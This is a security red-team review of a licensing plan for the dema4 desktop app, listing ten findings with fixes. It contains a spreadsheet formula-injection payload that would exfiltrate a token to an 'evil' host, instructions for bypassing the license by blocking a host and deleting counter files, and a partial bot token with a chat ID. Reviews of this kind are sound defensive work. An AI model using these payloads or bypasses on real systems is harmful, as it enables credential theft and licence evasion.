# Red team (security adversary) review: license giới hạn số lần

Scope: plan.md + phase-01..06, checked against dema4_rs/src/{telegram,google_sheet,main,gui,cau_hinh}.rs, gui_tach/nut_tach.rs, tach_vb/du_lieu_an.rs, build.rs, .github/workflows/build.yml, git history (origin/main).
These findings take the product owner's decisions as given (public repo, Apps Script relay, RSA, offline 2, token in a Sheet tab). They only attack how the plan carries those decisions out.

## Finding 1: Telegram bot token is already public on origin/main, and the plan waits until after rollout to revoke it
- **Severity:** Critical
- **Location:** Phase 5, Implementation Steps step 9; Phase 6 step 5; Phase 3 Tests 6-7
- **Flaw:** The plan treats the token as something that "đã nằm trong các exe cũ" and should be revoked only after v0.6.0 ships and machines update. In reality the token and chat id are hardcoded in the source of the public repo and pushed to `origin/main` and `origin/feat/tach-van-ban` (commit d702e51). Phase 3 tests 6-7 only grep the *current* source tree. Git history keeps the token.
- **Failure scenario:** Anyone who reads GitHub can call `getUpdates` and `sendMessage` with `7776430644:AAH…` today. That lets them read every stats message the bot can see (PC name, MAC, LAN/public IP, full folder paths), spam or phish group -878766449, or remove the bot from the group. Delaying revocation until "các máy đã cập nhật" leaves this open with no end date.
- **Evidence:** dema4_rs/src/telegram.rs:31-32; `git branch -r --contains d702e51` → origin/main; plans/261030-1009-license-gioi-han-so-lan/phase-05-trien-khai-tram.md:31; phase-06-kiem-thu-tong-va-phat-hanh.md:49; phase-03-kho-tram-va-bo-khoa-sheet.md:49
- **Suggested fix:** Revoke the token now, as step 0 and independent of the release. Put the new token only in the relay config. Accept that v0.5.x loses Telegram now, which the plan already accepts later. Add a release gate: "token in git history has been rotated". Also scrub or replace the hardcoded `CHAT_ID_NHUNG`.

## Finding 2: The service-account key in every published v0.5.x release can write to the license tab, and the plan leaves it valid for an unbounded time
- **Severity:** Critical
- **Location:** Phase 5, step 8 (revoke "sau khi … các máy đã cập nhật") vs. steps 2-6 (create license and `Cấu hình` tabs first)
- **Flaw:** CI embeds `SHEET_KEY_JSON` into every tagged release binary (v0.4.4…v0.5.2), and anyone can download those from GitHub Releases. The plan builds the license tabs and puts the new Telegram token in `Cấu hình` *in the same spreadsheet* before it revokes that key, and the revoke date depends on an unmeasurable condition.
- **Failure scenario:** An attacker runs `strings` on the public v0.5.2 asset and extracts the PEM. With the Sheets API they set their own row to `Đã cấp` with limit 99999, edit or delete other customers' rows, read `Cấu hình` (the new token), and plant formulas. This defeats the stated goal "chặn cố tình tự cấp quota trên Sheet" for as long as step 8 is not done. A second problem the plan does not cover: v0.5.x binaries stay downloadable and have no license check at all.
- **Evidence:** .github/workflows/build.yml:64; dema4_rs/build.rs:8-10; dema4_rs/src/google_sheet.rs:15,86; `git tag` → v0.4.4..v0.5.2; phase-05-trien-khai-tram.md:23-30
- **Suggested fix:** Disable the SA key in Cloud Console *before* step 2, or put license/Cấu hình in a new spreadsheet the SA never had access to. Remove assets from old releases, or record "old releases are an accepted bypass" explicitly in plan.md.

## Finding 3: The relay is bound to a spreadsheet in a Shared Drive, so shared-drive editors can read the RSA private key and the token
- **Severity:** High
- **Location:** Phase 2 Overview ("gắn với spreadsheet Monitor_dema4"); Phase 5 steps 2 and 10
- **Flaw:** A container-bound script can be opened and edited by anyone with edit access to the container. That includes Script Properties (`KHOA_BI_MAT`) and the ability to redeploy. Monitor_dema4 sits in the `Shared drives/TTCNTT` drive. Members of a shared drive inherit access, and you cannot remove that access per file. So step 10, "chỉ để spreadsheet chia sẻ cho tài khoản Sao Mai", cannot be done as written. Viewers can also see the `Cấu hình` tab.
- **Failure scenario:** Any TTCNTT shared-drive member opens Extensions › Apps Script › Project Settings and copies `KHOA_BI_MAT`. They can then sign `{trang_thai: DaCap, han_dem: 1e9}` for any machine through a local proxy. The RSA design collapses. The same person can also read the token from `Cấu hình`.
- **Evidence:** Monitor_dema4.gsheet sits at the repo root under ".../Shared drives/TTCNTT/..." (Google Drive shortcut, ignored at .gitignore `*.gsheet`); plans/261030-1009-license-gioi-han-so-lan/phase-02-tram-apps-script.md:13; phase-05-trien-khai-tram.md:23,32
- **Suggested fix:** Use a standalone Apps Script project in a dedicated account's My Drive that opens the sheet with `SpreadsheetApp.openById`. Move the license spreadsheet out of the shared drive, or audit its member list. Add a phase-5 check that lists who has access to the script project.

## Finding 4: Formula and HTML injection through unvalidated, self-reported fields (a route to exfiltrate the token)
- **Severity:** High
- **Location:** Phase 2 Requirements ("Kiểm tra đầu vào") and Architecture (license columns B-F, `thong_ke_tach` "y như hiện nay")
- **Flaw:** The server validates only `ma_may`, `chuc_nang`, `n`, and length. `may.ten`, `mac`, `ip_noi_bo`, `ip_public`, `phien_ban`, and the folder name come from the client and go straight into Sheet cells and Telegram HTML. Apps Script `setValues`/`appendRow` treat a leading `=` as a formula, and the current code already writes with `USER_ENTERED`. The IP sanitizing exists only on the client. The plan also contradicts itself: it says "không nhận chữ tự do" and then accepts a folder name up to 200 characters.
- **Failure scenario:** A `curl` request sends `kiem_tra` with `may.ten = =IMPORTXML("https://evil/x?t="&'Cấu hình'!B2;"//a")`. That writes the formula into row B of `license`. When the sheet recalculates, the token can leak to the attacker. Whether Sheets shows an external-data prompt depends on settings. Even with that prompt, `=HYPERLINK` phishing and corrupted cells still work. A folder name containing `<a href="phish">` reaches the staff Telegram group if the JS port does not copy `dam()` escaping exactly.
- **Evidence:** dema4_rs/src/google_sheet.rs:86 (`valueInputOption=USER_ENTERED`); dema4_rs/src/telegram.rs:100 (IP filter is client-side only), :122-124, :250 (`parse_mode=HTML`); plans/261030-1009-license-gioi-han-so-lan/phase-02-tram-apps-script.md:18,23,32,35-36
- **Suggested fix:** Validate on the server with whitelists: MAC regex, IPv4/IPv6 regex, `phien_ban` semver, and hostname charset. Force every string cell to text (`'` prefix or `setNumberFormat('@')` on the range before writing). HTML-escape in the JS composer. Add tests 4/6 that cover `=`, `+`, `-`, `@` and `<a>` payloads.

## Finding 5: The public relay keys on a self-chosen machine ID, so per-ID limits do nothing and an unauthenticated DoS can push every customer into offline mode
- **Severity:** High
- **Location:** Phase 2 Requirements (rate limit per mã máy, usage "đếm từ nhật ký"), Risk Assessment last bullet
- **Flaw:** Apps Script `doPost` cannot see the caller's IP, so the only throttle is per `ma_may`, and the attacker picks that value. `kiem_tra` auto-registers any string that matches the format. The Telegram queue has no global size limit. The relay rebuilds "đã dùng" by scanning the full log while holding the script lock, so each call costs O(log size).
- **Failure scenario:** A script loops over random `SM-XXXX-XXXX-XXXX` values. That adds unlimited rows to `license` (toward the 10M-cell limit), unlimited rows to `license_nhat_ky`, and unlimited queued messages. The queue drains 15 per minute, so real stats wait for hours or days, which breaks plan.md "chậm tối đa vài phút". As the log grows, calls run past the 4 s client timeout. Every client falls back to the offline rule, and licensed (`Đã cấp`) customers get capped at 2 runs per function, i.e. paying users are blocked. The 30-concurrent-execution limit is used up as well.
- **Evidence:** plans/261030-1009-license-gioi-han-so-lan/phase-02-tram-apps-script.md:16-19,21,32,68,70; plan.md:25,31,52; phase-03-kho-tram-va-bo-khoa-sheet.md:17
- **Suggested fix:** Add global caps in `CacheService`/`PropertiesService`: new registrations per hour, maximum queue length (drop stats rather than license writes past it), calls per minute. Keep usage counters in the license row and update them under the lock instead of rescanning the log. Rotate or archive the log. Add a phase-6 test that registers 10,000 fake IDs and measures latency for a real ID.

## Finding 6: `ghi_lan` is not idempotent, and the timeouts do not line up, so runs get counted twice
- **Severity:** High
- **Location:** Phase 3 Requirements (timeout 4 s); Phase 2 (lock wait ≤ 10 s, cold start 3-5 s); Phase 4 `da_chay`
- **Flaw:** The client gives up after 4 s and adds to the offline counter. The relay may still finish after that: it can wait up to 10 s for the lock, and a cold start takes 3-5 s. The relay logs the run anyway, and the next call sends `bu_offline=1` for the same run. No request or run ID exists to deduplicate.
- **Failure scenario:** A trial user's first run hits a cold start. The relay logs it at second 5, and the client has already counted it offline at second 4. On the next start `ghi_bu` logs it again, so the user is blocked after one real run. Phase 6 case 16 (20 machines at once) triggers this routinely and will report "không mất lượt" while it over-counts.
- **Evidence:** plans/261030-1009-license-gioi-han-so-lan/phase-03-kho-tram-va-bo-khoa-sheet.md:17; phase-02-tram-apps-script.md:21,67; phase-04-gan-license-gui-va-dong-lenh.md:27,46
- **Suggested fix:** Give each run a client-generated ID (UUID). `ghi_lan`/`ghi_bu` carry run IDs, and the relay ignores IDs already logged. Store pending run IDs offline instead of bare counts. Add a test: a slow fake store that commits after the client times out must give `da_dung == 1`.

## Finding 7: Usage is recorded after the run, in memory, and saved to disk only on a network error, so closing the app or running in parallel bypasses the limit
- **Severity:** High
- **Location:** Phase 4 Architecture (`da_chay`, CLI line), Risk Assessment "Nhiều cửa sổ"
- **Flaw:** `da_chay` raises an in-memory counter and starts a thread. `BoDemOffline::cong` runs only when that thread gets an error. Results are written and shown before this. If the process exits before the relay call finishes (1-5 s), nothing is saved anywhere. The CLI checks once at start and records at the end, a time-of-check/time-of-use (TOCTOU) gap. CLI `--khong-ghi` prints the full result and returns before the "saved ≥1 file" point.
- **Failure scenario:** (a) A user runs Đếm, the result file is written, and they close the window right away, which ordinary users do. The run is never counted, and every new launch shows the old `da_dung`, so usage is unlimited without any tampering. (b) `for d in */; do dema4_saomai "$d" & done` passes N parallel start checks with 1 run left. (c) Ctrl+C after `print!(kq.tong_hop)`, or `--khong-ghi`, also leaves the run uncounted.
- **Evidence:** plans/261030-1009-license-gioi-han-so-lan/phase-04-gan-license-gui-va-dong-lenh.md:27,31-32,64; dema4_rs/src/gui.rs:837-843 (result saved before any hook); dema4_rs/src/main.rs:72-74 (`--khong-ghi` returns after printing)
- **Suggested fix:** Write ahead: save a pending run ID to both offline files *before* showing or saving the result, and clear it on a signed ack. For the CLI, reserve a run with the relay before starting (atomic under the lock) and count `--khong-ghi` runs. Add tests for "process killed after the run, before the ack" and "two CLI processes with 1 run left".

## Finding 8: The machine ID uses hostname and the first MAC, so renaming the PC gives a fresh trial, and a VPN or dock turns a licensed customer back into a trial
- **Severity:** High
- **Location:** Phase 1, Requirements line 1 and Architecture "Băm: SHA-256 của ten|mac|ma_hdh"; Risk Assessment last bullet
- **Flaw:** `ten_pc()` is the user-editable device name. `dia_chi_mac()` returns the first non-loopback interface reported by the OS, which changes with VPN adapters, USB-Ethernet, docks, and Wi-Fi private addresses, and falls back to `"?"`. That contradicts "không đổi khi bật VPN / cắm thêm card mạng". When `reg`/`ioreg` fails, the ID depends only on hostname and MAC.
- **Failure scenario:** An ordinary user renames the PC in Settings and reboots, gets a new `SM-…` ID and 2+2 fresh runs, and repeats. This is the cheapest bypass and needs no tooling. A licensed customer who plugs in a dock gets a new ID with Dùng thử 2/2 and calls support.
- **Evidence:** dema4_rs/src/telegram.rs:70-80; plans/261030-1009-license-gioi-han-so-lan/phase-01-loi-license.md:16,35-36,48,64
- **Suggested fix:** Hash only MachineGuid or IOPlatformUUID. If neither is available, generate a random install ID stored in both offline locations. Send hostname and MAC as metadata only. Change test 1 to "changing MAC/hostname does NOT change the ID".

## Finding 9: The offline rule is a permanent bypass: block one host and delete two files whose paths are documented
- **Severity:** Medium
- **Location:** Phase 1 `BoDemOffline`; Phase 4 `quyet_dinh` ("chưa có → luật offline")
- **Flaw:** If no signed snapshot exists, the offline rule gives 2 runs. The counter is two plain-text files at fixed paths that the public repo documents, and nothing anchors it to the server's count.
- **Failure scenario:** Add `script.google.com` to the hosts file (or block it in the firewall), then delete `<exe>/.sm-dema4/license_offline.txt` and `%APPDATA%/sm-dema4/license_offline.txt` after every 2 runs. Usage is unlimited, and a one-line `.bat` could be shared around. Copying the exe to a non-writable folder also moves the first location to a fallback (`goc_du_lieu`).
- **Evidence:** plans/261030-1009-license-gioi-han-so-lan/phase-01-loi-license.md:18,32,38; phase-04-gan-license-gui-va-dong-lenh.md:25; dema4_rs/src/tach_vb/du_lieu_an.rs:56-66; dema4_rs/src/cau_hinh.rs:316-325
- **Suggested fix:** Save the last signed snapshot to disk (it cannot be forged) and use `max(snapshot.da_dung + pending, …)`. If no signed snapshot has ever existed on this install, allow 0-1 offline runs, not 2. Accepting the residual risk is fine, but say so in plan.md.

## Finding 10: Anyone who knows a machine ID can burn a paying customer's quota, and plan.md presents this as acceptable
- **Severity:** Medium
- **Location:** Phase 2 Risk Assessment last bullet; Requirements `ghi_bu` n ≤ 10
- **Flaw:** Machine IDs are not secret: they appear in mailto subjects, in Sheet rows, and in screenshots sent to support. `ghi_bu` lets a caller add up to 10 runs per call with no proof the runs happened. At "≤ 30 lời gọi / 10 phút" that is up to 300 burned runs per 10 minutes per ID. `kiem_tra` from an attacker also overwrites the victim row's metadata.
- **Failure scenario:** A competitor or disgruntled user takes a customer's ID from a forwarded email and runs a curl loop. The customer's `Đã cấp` 100-run quota is gone in minutes, they get "Số lần Đếm còn lại (0)" and blame Sao Mai.
- **Evidence:** plans/261030-1009-license-gioi-han-so-lan/phase-02-tram-apps-script.md:16,23,70; phase-04-gan-license-gui-va-dong-lenh.md:18 (`mailto` with machine ID)
- **Suggested fix:** Cap `ghi_bu` at the offline maximum (2 per function) per sync and per day. Combine with Finding 6 run IDs. Do not overwrite row metadata on `kiem_tra` for rows that already exist. Raise an alert when one ID's usage spikes.

## Fact-check notes (claims about current code)
- Verified to exist: `gui.rs::bat_dau_dem` (685), `luu_va_thong_bao` (837), `nut_tach.rs::bat_dau_tach` (273), `nhan_ket_qua_tach` (305), `gui_thong_ke` (156), `main.rs::chay_tach` (98), `tro_giup::logo` (18), `gioi_thieu::WEB` (73), `cau_hinh::thu_muc_nguoi_dung` (316, `pub(crate)`), `rsa` with `sha2` (Cargo.toml:26), `ten_pc`/`dia_chi_mac`/`ip_noi_bo`/`ip_public` in telegram.rs.
- False: phase-03:31 says the struct `SoLieuDem` "đã có". It does not exist (only `SoLieuTach` telegram.rs:150 and `ThongKeNguong` thong_ke_nguong.rs:36). Counting stats use `KetQuaDem`.
- Missing: phase-03:31 lists only gui.rs and nut_tach.rs as Telegram callers to migrate. The CLI count path also sends directly (main.rs:80-86) and needs to move to `thong_ke_dem`.
- Missing: phase-04 test 8 covers only `chay_tach`. CLI Đếm (`chay_dong_lenh`, including `--khong-ghi`) has no license test.
- The nonce needs a CSPRNG. The plan names no source, and `rand`/`getrandom` are not direct dependencies.

Status: DONE
Summary: Ten findings: 2 Critical (the Telegram token is already public on origin/main; the SA key in public releases can write the license tab until an open-ended revocation), 6 High (bound script in a Shared Drive exposes the RSA key, formula/HTML injection, unauthenticated DoS via self-chosen IDs, non-idempotent counting, usage lost when the app closes, machine ID resettable by renaming the PC), 2 Medium. The plan's claim that struct `SoLieuDem` exists is false, and the CLI Đếm Telegram path is missing from phase 3.
